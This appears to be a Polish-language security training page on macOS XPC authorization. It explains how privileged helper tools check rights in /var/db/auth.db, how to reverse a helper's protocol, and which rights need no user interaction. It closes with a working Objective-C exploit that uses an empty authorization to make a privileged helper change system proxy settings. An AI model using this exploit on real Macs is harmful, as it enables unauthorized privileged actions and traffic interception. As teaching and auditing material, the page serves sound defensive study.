# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple proponuje również inny sposób uwierzytelniania, czy proces łączący ma **uprawnienia do wywołania ujawnionej metody XPC**.

Gdy aplikacja potrzebuje **wykonywać działania jako użytkownik z uprawnieniami**, zamiast uruchamiać aplikację jako użytkownik z uprawnieniami, zazwyczaj instaluje jako root HelperTool jako usługę XPC, która może być wywoływana z aplikacji w celu wykonania tych działań. Jednak aplikacja wywołująca usługę powinna mieć wystarczające uprawnienia.

### ShouldAcceptNewConnection zawsze YES

Przykład można znaleźć w [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). W `App/AppDelegate.m` próbuje **połączyć się** z **HelperTool**. A w `HelperTool/HelperTool.m` funkcja **`shouldAcceptNewConnection`** **nie sprawdzi** żadnych z wcześniej wskazanych wymagań. Zawsze zwróci YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Aby uzyskać więcej informacji na temat prawidłowej konfiguracji tego sprawdzenia, zobacz:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Prawa aplikacji

Jednakże, gdy wywoływana jest metoda z HelperTool, zachodzi pewna **autoryzacja**.

Funkcja **`applicationDidFinishLaunching`** z `App/AppDelegate.m` utworzy pusty odnośnik autoryzacji po uruchomieniu aplikacji. To powinno zawsze działać.\
Następnie spróbuje **dodać pewne prawa** do tego odnośnika autoryzacji, wywołując `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcja `setupAuthorizationRights` z `Common/Common.m` zapisze w bazie danych autoryzacji `/var/db/auth.db` prawa aplikacji. Zauważ, że doda tylko te prawa, które jeszcze nie znajdują się w bazie danych:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcja `enumerateRightsUsingBlock` jest używana do uzyskiwania uprawnień aplikacji, które są zdefiniowane w `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
To oznacza, że na końcu tego procesu, uprawnienia zadeklarowane w `commandInfo` będą przechowywane w `/var/db/auth.db`. Zauważ, że możesz znaleźć dla **każdej metody**, która **wymaga autoryzacji**, **nazwę uprawnienia** oraz **`kCommandKeyAuthRightDefault`**. To ostatnie **wskazuje, kto może uzyskać to prawo**.

Istnieją różne zakresy, aby wskazać, kto może uzyskać dostęp do prawa. Niektóre z nich są zdefiniowane w [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (możesz znaleźć [wszystkie z nich tutaj](https://www.dssw.co.uk/reference/authorization-rights/)), ale w skrócie:

<table><thead><tr><th width="284.3333333333333">Nazwa</th><th width="165">Wartość</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Każdy</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nikt</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Aktualny użytkownik musi być administratorem (w grupie administratorów)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Poproś użytkownika o autoryzację.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Poproś użytkownika o autoryzację. Musi być administratorem (w grupie administratorów)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Określ zasady</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Określ dodatkowe komentarze dotyczące prawa</td></tr></tbody></table>

### Weryfikacja Praw

W `HelperTool/HelperTool.m` funkcja **`readLicenseKeyAuthorization`** sprawdza, czy wywołujący ma uprawnienia do **wykonania takiej metody**, wywołując funkcję **`checkAuthorization`**. Ta funkcja sprawdzi, czy **authData** wysłane przez wywołujący proces ma **poprawny format**, a następnie sprawdzi **co jest potrzebne, aby uzyskać prawo** do wywołania konkretnej metody. Jeśli wszystko pójdzie dobrze, **zwrócony `error` będzie `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Zauważ, że aby **sprawdzić wymagania do uzyskania** prawa do wywołania tej metody, funkcja `authorizationRightForCommand` po prostu sprawdzi wcześniej skomentowany obiekt **`commandInfo`**. Następnie wywoła **`AuthorizationCopyRights`**, aby sprawdzić **czy ma prawa** do wywołania funkcji (zauważ, że flagi pozwalają na interakcję z użytkownikiem).

W tym przypadku, aby wywołać funkcję `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` jest zdefiniowane jako `@kAuthorizationRuleClassAllow`. Tak więc **każdy może to wywołać**.

### Informacje o DB

Wspomniano, że te informacje są przechowywane w `/var/db/auth.db`. Możesz wylistować wszystkie przechowywane reguły za pomocą:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Następnie możesz sprawdzić, kto ma dostęp do uprawnienia za pomocą:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permisy

Możesz znaleźć **wszystkie konfiguracje uprawnień** [**tutaj**](https://www.dssw.co.uk/reference/authorization-rights/), ale kombinacje, które nie będą wymagały interakcji użytkownika, to:

1. **'authenticate-user': 'false'**
- To jest najprostszy klucz. Jeśli ustawiony na `false`, oznacza, że użytkownik nie musi podawać uwierzytelnienia, aby uzyskać to prawo.
- Używa się go w **kombinacji z jednym z 2 poniżej lub wskazując grupę**, do której użytkownik musi należeć.
2. **'allow-root': 'true'**
- Jeśli użytkownik działa jako użytkownik root (który ma podwyższone uprawnienia), a ten klucz jest ustawiony na `true`, użytkownik root może potencjalnie uzyskać to prawo bez dalszego uwierzytelnienia. Jednak zazwyczaj uzyskanie statusu użytkownika root już wymaga uwierzytelnienia, więc nie jest to scenariusz "bez uwierzytelnienia" dla większości użytkowników.
3. **'session-owner': 'true'**
- Jeśli ustawiony na `true`, właściciel sesji (aktualnie zalogowany użytkownik) automatycznie uzyska to prawo. Może to obejść dodatkowe uwierzytelnienie, jeśli użytkownik jest już zalogowany.
4. **'shared': 'true'**
- Ten klucz nie przyznaje praw bez uwierzytelnienia. Zamiast tego, jeśli ustawiony na `true`, oznacza, że po uwierzytelnieniu prawa mogą być dzielone między wieloma procesami, bez potrzeby ponownego uwierzytelniania każdego z nich. Jednak początkowe przyznanie prawa nadal wymagałoby uwierzytelnienia, chyba że połączone z innymi kluczami, takimi jak `'authenticate-user': 'false'`.

Możesz [**użyć tego skryptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), aby uzyskać interesujące prawa:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Odwracanie autoryzacji

### Sprawdzanie, czy używana jest EvenBetterAuthorization

Jeśli znajdziesz funkcję: **`[HelperTool checkAuthorization:command:]`**, prawdopodobnie proces używa wcześniej wspomnianego schematu autoryzacji:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Jeśli ta funkcja wywołuje funkcje takie jak `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, to używa [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Sprawdź **`/var/db/auth.db`**, aby zobaczyć, czy możliwe jest uzyskanie uprawnień do wywołania niektórej uprzywilejowanej akcji bez interakcji użytkownika.

### Komunikacja protokołowa

Następnie musisz znaleźć schemat protokołu, aby móc nawiązać komunikację z usługą XPC.

Funkcja **`shouldAcceptNewConnection`** wskazuje na eksportowany protokół:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

W tym przypadku mamy to samo, co w EvenBetterAuthorizationSample, [**sprawdź tę linię**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znając nazwę używanego protokołu, możliwe jest **zrzucenie definicji jego nagłówka** za pomocą:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na koniec musimy tylko znać **nazwę wystawionej usługi Mach**, aby nawiązać z nią komunikację. Istnieje kilka sposobów, aby to znaleźć:

- W **`[HelperTool init]`**, gdzie można zobaczyć używaną usługę Mach:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- W pliku launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Przykład Eksploatacji

W tym przykładzie utworzono:

- Definicję protokołu z funkcjami
- Pustą autoryzację do użycia w celu uzyskania dostępu
- Połączenie z usługą XPC
- Wywołanie funkcji, jeśli połączenie było udane
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Inne nadużycia pomocników uprawnień XPC

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Odniesienia

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
